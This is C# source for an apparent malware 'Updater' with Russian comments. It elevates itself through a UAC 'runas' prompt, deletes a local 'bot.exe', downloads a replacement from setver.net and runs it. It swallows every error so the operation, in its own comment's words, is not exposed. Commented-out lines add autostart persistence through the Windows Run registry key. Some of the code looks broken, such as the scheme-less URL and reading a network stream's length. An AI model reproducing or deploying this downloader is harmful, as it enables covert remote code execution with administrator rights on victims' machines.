using System;
using System.Collections.Generic;

using System.Text;

using System.IO;
using System.Net;
using System.Diagnostics;
using Microsoft.Win32;
using System.Security.Principal;
using System.Windows.Forms;

namespace Updater
{
    class Program
    {
        const string PATH = @"D:\"; //путь к папке с клиентом бота
        const string NAME = "bot.exe";
        const string URL = "setver.net/update.exe";

        static void Main(string[] args)
        {
            WindowsPrincipal pricipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            bool hasAdministrativeRight = pricipal.IsInRole(WindowsBuiltInRole.Administrator);

            if (hasAdministrativeRight == false)
            {
                ProcessStartInfo processInfo = new ProcessStartInfo(); //создаем новый процесс
                processInfo.Verb = "runas"; //в данном случае указываем, что процесс должен быть запущен с правами администратора
                processInfo.FileName = Application.ExecutablePath;
                try
                {
                    Process.Start(processInfo); //пытаемся запустить процесс
                }
                catch (Exception e)
                {
                    //Ничего не делаем, потому что пользователь, возможно, нажал кнопку "Нет" в ответ на вопрос о запуске программы в окне предупреждения UAC (для Windows 7)
                }
                Application.Exit(); //закрываем текущую копию программы (в любом случае, даже если пользователь отменил запуск с правами администратора в окне UAC)
            }
            else //имеем права администратора, значит, продолжаем
            {
                string pathToFile = PATH + NAME;

                if (File.Exists(pathToFile)) //проверяем, установлен ли уже бот
                {
                    //если установлен, то проверяем обновления
                    //все исключения молча перехватывается, чтобы не палить контору.
                    try
                    {

                        File.Delete(pathToFile);

                        //скачивание и сохранение файла
                        WebClient wc = new WebClient();
                        Stream stream = wc.OpenRead(URL);

                        byte[] data = new byte[stream.Length];
                        stream.Read(data, 0, (int)stream.Length);

                        FileStream fs = File.Create(pathToFile);
                        fs.Write(data, 0, data.Length);

                        //запуск бота
                        if (File.Exists(pathToFile))
                            Process.Start(pathToFile);
                    }
                    catch (Exception e)
                    { }
                }
                else //запускаем установку
                {
                    //в противном случае, устанавливаем бота
                    //string prfiles = Environment.GetEnvironmentVariable("ProgramFiles");
                    //File.Create(@"c:\Users\Andrew\Contacts"+"123.txt");
                    //Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    //regkey.SetValue("NameProgram", @"d:\123.exe");
                    //string guid = Guid.NewGuid().ToString();
                    //RegistryKey rk = Registry.LocalMachine;
                    //RegistryKey software = rk.OpenSubKey("SOFTWARE", true);
                    //RegistryKey key = software.CreateSubKey("Andrew");
                    //key.SetValue("GUID", guid);
                    //key.Close();
                    //Console.ReadKey();
                }

            }
        }
    }
}